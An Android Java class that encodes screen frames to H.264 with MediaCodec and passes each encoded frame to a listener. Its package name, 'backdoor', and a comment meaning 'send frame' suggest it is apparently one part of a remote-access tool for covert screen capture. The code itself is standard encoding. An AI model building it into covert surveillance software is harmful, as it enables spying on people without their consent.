package com.lazyframework.backdoor;

import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.os.Build;
import android.util.Log;
import android.view.Surface;

import java.io.IOException;
import java.nio.ByteBuffer;

public class ScreenRecorder {
    private static final String TAG = "ScreenRecorder";
    
    // ==================== CONFIG ====================
    private static final String MIME_TYPE = "video/avc"; // H.264
    private static final int FRAME_RATE = 20;
    private static final int I_FRAME_INTERVAL = 2;
    private static final int BIT_RATE = 2000000; // 2 Mbps
    
    // ==================== ENCODER ====================
    private MediaCodec encoder;
    private Surface surface;
    private MediaCodec.BufferInfo bufferInfo;
    private boolean isEncoding = false;
    private int width, height;
    
    // ==================== LISTENER ====================
    private OnEncodedFrameListener frameListener;
    
    public interface OnEncodedFrameListener {
        void onEncodedFrame(byte[] data, int flags, long timestamp);
    }
    
    public ScreenRecorder(int width, int height, OnEncodedFrameListener listener) {
        this.width = width;
        this.height = height;
        this.frameListener = listener;
        this.bufferInfo = new MediaCodec.BufferInfo();
    }
    
    public void start() throws IOException {
        Log.d(TAG, "🎬 Starting video encoder: " + width + "x" + height);
        
        // Create encoder
        MediaFormat format = MediaFormat.createVideoFormat(MIME_TYPE, width, height);
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT, 
            MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE);
        format.setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_FRAME_INTERVAL);
        
        // For better quality
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            format.setInteger(MediaFormat.KEY_PRIORITY, 0);
        }
        
        encoder = MediaCodec.createEncoderByType(MIME_TYPE);
        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        surface = encoder.createInputSurface();
        encoder.start();
        
        isEncoding = true;
        Log.d(TAG, "✅ Encoder started");
    }
    
    public Surface getSurface() {
        return surface;
    }
    
    public void encodeFrame() {
        if (!isEncoding || encoder == null) return;
        
        try {
            int outputBufferIndex = encoder.dequeueOutputBuffer(bufferInfo, 0);
            
            while (outputBufferIndex >= 0) {
                ByteBuffer outputBuffer = encoder.getOutputBuffer(outputBufferIndex);
                
                if (outputBuffer != null && bufferInfo.size > 0) {
                    // Kirim frame
                    byte[] frameData = new byte[bufferInfo.size];
                    outputBuffer.get(frameData);
                    
                    if (frameListener != null) {
                        frameListener.onEncodedFrame(frameData, bufferInfo.flags, bufferInfo.presentationTimeUs);
                    }
                }
                
                encoder.releaseOutputBuffer(outputBufferIndex, false);
                outputBufferIndex = encoder.dequeueOutputBuffer(bufferInfo, 0);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Encode error: " + e.getMessage());
        }
    }
    
    public void stop() {
        isEncoding = false;
        try {
            if (encoder != null) {
                encoder.stop();
                encoder.release();
                encoder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop error: " + e.getMessage());
        }
        Log.d(TAG, "⏹️ Encoder stopped");
    }
    
    public boolean isEncoding() {
        return isEncoding;
    }
}
